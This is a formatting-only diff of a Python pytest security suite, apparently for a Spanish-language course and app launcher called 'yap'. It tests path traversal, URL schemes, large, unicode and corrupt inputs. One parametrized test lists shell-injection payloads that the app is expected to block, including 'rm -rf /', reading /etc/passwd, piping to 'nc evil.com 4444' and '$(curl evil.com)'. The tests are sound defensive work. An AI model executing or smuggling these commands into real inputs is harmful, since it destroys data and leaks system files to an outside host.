@@ -33,14 +33,23 @@ class TestPathTraversal:
         self.cursos_dir = os.path.join(self.tmp_dir, "cursos")
         os.makedirs(self.cursos_dir)
         # Create a valid course
-        with open(os.path.join(self.cursos_dir, "FPY1101.json"), "w", encoding="utf-8") as f:
-            json.dump({
-                "codigo": "FPY1101", "nombre": "Test", "horas": 1,
-                "semanas": 1, "ras": [], "eas": [], "evaluaciones": []
-            }, f)
+        with open(os.path.join(self.cursos_dir, "FPY1101.json"), "w") as f:
+            json.dump(
+                {
+                    "codigo": "FPY1101",
+                    "nombre": "Test",
+                    "horas": 1,
+                    "semanas": 1,
+                    "ras": [],
+                    "eas": [],
+                    "evaluaciones": [],
+                },
+                f,
+            )
 
     def teardown_method(self):
         import shutil
+
         shutil.rmtree(self.tmp_dir, ignore_errors=True)
 
     def test_traversal_doble_punto(self):
@@ -91,6 +100,7 @@ class TestSchemeValidation:
 
     def teardown_method(self):
         import shutil
+
         shutil.rmtree(self.tmp_dir, ignore_errors=True)
 
     def test_file_scheme_bloqueado(self):
@@ -138,20 +148,24 @@ class TestAppInjectionFuzz:
 
     def teardown_method(self):
         import shutil
+
         shutil.rmtree(self.tmp_dir, ignore_errors=True)
 
-    @pytest.mark.parametrize("payload", [
-        "Firefox; rm -rf /",
-        "Firefox && cat /etc/passwd",
-        "Firefox | nc evil.com 4444",
-        "$(curl evil.com)",
-        "`id`",
-        "Firefox${IFS}rm${IFS}-rf${IFS}/",
-        "Firefox\nrm -rf /",
-        "Firefox;shutdown -h now",
-        "Firefox & disown",
-        "Firefox > /dev/null 2>&1; rm -rf /",
-    ])
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "Firefox; rm -rf /",
+            "Firefox && cat /etc/passwd",
+            "Firefox | nc evil.com 4444",
+            "$(curl evil.com)",
+            "`id`",
+            "Firefox${IFS}rm${IFS}-rf${IFS}/",
+            "Firefox\nrm -rf /",
+            "Firefox;shutdown -h now",
+            "Firefox & disown",
+            "Firefox > /dev/null 2>&1; rm -rf /",
+        ],
+    )
     def test_injection_bloqueado(self, payload):
         """Todos los payloads de injection deben ser bloqueados."""
         with mock.patch.object(yap, "WHITELIST_APPS", self.apps_path):
@@ -166,9 +180,7 @@ class TestLargeInputFuzz:
         """Un prompt de 100KB no debe crashear cmd_query."""
         long_prompt = "A" * 100000
         with mock.patch("subprocess.run") as mock_run:
-            mock_run.return_value = mock.MagicMock(
-                stdout="ok", stderr="", returncode=0
-            )
+            mock_run.return_value = mock.MagicMock(stdout="ok", stderr="", returncode=0)
             result = yap.cmd_query(long_prompt)
             # No debe crashear, debe retornar algo
             assert isinstance(result, str)
@@ -184,6 +196,7 @@ class TestLargeInputFuzz:
             result = yap.cmd_open_app(long_name)
             assert "[ERROR]" in result
         import shutil
+
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
 
@@ -199,6 +212,7 @@ class TestUnicodeFuzz:
             result = yap.cmd_open_app("🔥💥")
             assert "[ERROR]" in result
         import shutil
+
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
     def test_unicode_en_url(self):
@@ -211,6 +225,7 @@ class TestUnicodeFuzz:
             # No debe crashear
             assert isinstance(result, str)
         import shutil
+
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
 
@@ -228,6 +243,7 @@ class TestCorruptJsonFuzz:
             with pytest.raises(json.JSONDecodeError):
                 yap.cargar_curso("BROKEN")
         import shutil
+
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
     def test_progreso_corrupto(self):
@@ -240,6 +256,7 @@ class TestCorruptJsonFuzz:
             result = yap.cargar_progreso()
             assert result == {"cursos": {}}
         import shutil
+
         shutil.rmtree(tmp_dir, ignore_errors=True)
 
 
